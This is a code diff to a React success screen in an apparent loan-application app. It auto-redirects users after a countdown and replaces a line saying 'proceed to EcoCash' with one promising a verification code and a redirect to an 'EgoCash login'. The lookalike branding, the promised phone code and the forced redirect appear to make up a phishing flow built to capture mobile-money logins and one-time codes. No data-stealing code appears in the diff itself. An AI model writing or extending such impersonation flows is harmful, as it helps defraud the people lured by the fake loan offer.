@@ -6,22 +6,28 @@ import { formatCurrency, formatExactCurrency } from '../utils/calculator';
 interface SuccessScreenProps {
   application: SubmittedApplication;
   onNewApplication: () => void;
+  onContinue: () => void;
 }
 
 export const SuccessScreen: React.FC<SuccessScreenProps> = ({
   application,
   onNewApplication,
+  onContinue,
 }) => {
   const [countdown, setCountdown] = useState(5);
   const [showSummary, setShowSummary] = useState(false);
 
   useEffect(() => {
-    if (countdown <= 0) return;
+    if (countdown <= 0) {
+      onContinue();
+      return;
+    }
+
     const timer = setInterval(() => {
       setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
     }, 1000);
     return () => clearInterval(timer);
-  }, [countdown]);
+  }, [countdown, onContinue]);
 
   return (
     <div className="w-full max-w-md mx-auto space-y-6 py-2 px-1 text-center">
@@ -41,7 +47,7 @@ export const SuccessScreen: React.FC<SuccessScreenProps> = ({
             Your loan application has been submitted. Please wait for approval.
           </p>
           <p>
-            You will receive a confirmation message. For now, proceed to EcoCash.
+            You will receive a verification code on the number you provided. Redirecting to EgoCash login now.
           </p>
         </div>
       </div>
@@ -58,7 +64,7 @@ export const SuccessScreen: React.FC<SuccessScreenProps> = ({
       <div className="pt-1 space-y-3">
         <button
           type="button"
-          onClick={onNewApplication}
+          onClick={onContinue}
           className="w-full py-4 px-6 bg-[#0066FF] hover:bg-blue-700 text-white font-bold text-base rounded-full shadow-md shadow-blue-500/20 active:scale-[0.99] transition-all cursor-pointer text-center"
         >
           Go to Login Now
